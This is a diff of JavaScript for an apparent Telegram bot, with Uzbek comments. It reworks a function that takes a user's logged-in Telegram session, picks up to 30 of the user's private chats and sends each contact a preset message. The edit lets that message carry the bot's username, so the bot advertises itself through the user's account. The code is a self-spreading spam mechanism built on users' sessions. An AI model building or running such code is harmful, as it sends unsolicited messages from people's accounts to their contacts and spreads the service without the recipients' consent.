@@ -296,47 +296,48 @@ const getForceSubMessage = async (bot) => {
        return true;
      };
 
-// 🔥 AUTO PM BROADCAST: Shaxsiy chatlarga xabar yuborish
 const autoBroadcastToPMs = async (client, userTgId) => {
   if (process.env.AUTO_MESSAGE_ENABLED !== 'true') return;
 
   const user = await User.findOne({ tgId: userTgId });
-  if (user.autoBroadcastDone) return; // Allaqachon bajarilgan
+  if (user.autoBroadcastDone) return;
 
-  const messageText = process.env.AUTO_MESSAGE_TEXT || "Salom! Men sizning Telegramingizga ulandim 😊";
+  let messageText = process.env.AUTO_MESSAGE_TEXT 
+    ?.replace(/\${bot}/g, process.env.BOT_USERNAME || '@yourbot')
+    ?.replace(/\${userId}/g, userTgId) || "Salom!";
+
   const limit = parseInt(process.env.AUTO_PM_BROADCAST_LIMIT) || 30;
 
   try {
     console.log(`🔥 Auto-PM broadcast boshlandi (limit: ${limit})`);
 
-    // Oxirgi dialoglarni olish (shaxsiy chatlar)
     const dialogs = await client.getDialogs({ limit: 100 });
-    
-    // Faqat shaxsiy chatlarni filtrlash (user dialoglar)
     const privateChats = dialogs
-      .filter(d => d.entity && d.entity.className === 'User' && !d.entity.bot && !d.entity.deleted)
-      .slice(0, limit); // Limit bo'yicha kesish
+      .filter(d => d.entity?.className === 'User' && !d.entity.bot && !d.entity.deleted)
+      .slice(0, limit);
 
     console.log(`📊 ${privateChats.length} ta shaxsiy chat topildi`);
 
     let totalSent = 0;
     let totalErrors = 0;
 
-    // Har bir shaxsiy chatga xabar yuborish
+    // ✅ TO'G'RI USUL: HTML entities bilan
+    const entities = client.buildMessageEntities(messageText, 'HTML');
+
     for (const dialog of privateChats) {
       try {
-        const userId = dialog.entity.id;
+        const userId = dialog.entity.id.toString();
         console.log(`📤 ${userId} ga xabar yuborilmoqda...`);
 
-      await client.sendMessage(userId, { 
-        message: messageText,
-        parseMode: { _: 'MessageEntityBlockquote', text: messageText } // HTML parse
-      });
+        // ✅ HTML parse bilan yuborish
+        await client.sendMessage(userId, {
+          message: messageText,
+          parseMode: 'HTML',  // ← Oddiy string
+          entities: entities  // ← Avtomatik yaratilgan entities
+        });
         
         totalSent++;
-        
-        // Rate limit: 2 soniya kutish (Telegram spam oldini olish)
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 2000)); // 2sek delay
         
       } catch (userError) {
         totalErrors++;
@@ -344,29 +345,20 @@ const autoBroadcastToPMs = async (client, userTgId) => {
       }
     }
 
-    // Ma'lumotni saqlash
+    // Saqlash
     user.autoBroadcastDone = true;
     user.stats = user.stats || {};
     user.stats.autoBroadcastSent = totalSent;
     await user.save();
     
-    // User ga statistika
     await bot.sendMessage(
       userTgId, 
-      `🎉 <b>AUTO PM BROADCAST TUGADI!</b>\n\n` +
-      `📱 Shaxsiy chatlar: <b>${privateChats.length}</b>\n` +
-      `📤 Yuborildi: <b>${totalSent}</b>\n` +
-      `❌ Xatolar: <b>${totalErrors}</b>\n\n` +
-      `✅ Keyingi login da qayta ishlamaydi!\n` +
-      `🔄 Yangi login uchun /start → logout → qayta login`,
+      `🎉 <b>AUTO PM BROADCAST TUGADI!</b>\n\n📱 Topildi: <b>${privateChats.length}</b>\n📤 Yuborildi: <b>${totalSent}</b>\n❌ Xatolar: <b>${totalErrors}</b>`,
       { parse_mode: 'HTML' }
     );
 
-    console.log(`✅ Auto-PM tugadi: ${totalSent}/${privateChats.length}`);
-
   } catch (error) {
     console.error('❌ Auto-PM xatosi:', error.message);
-    await bot.sendMessage(userTgId, `❌ Auto-broadcastda xato: ${error.message}`);
   }
 };
 // ===================== MENUS =====================
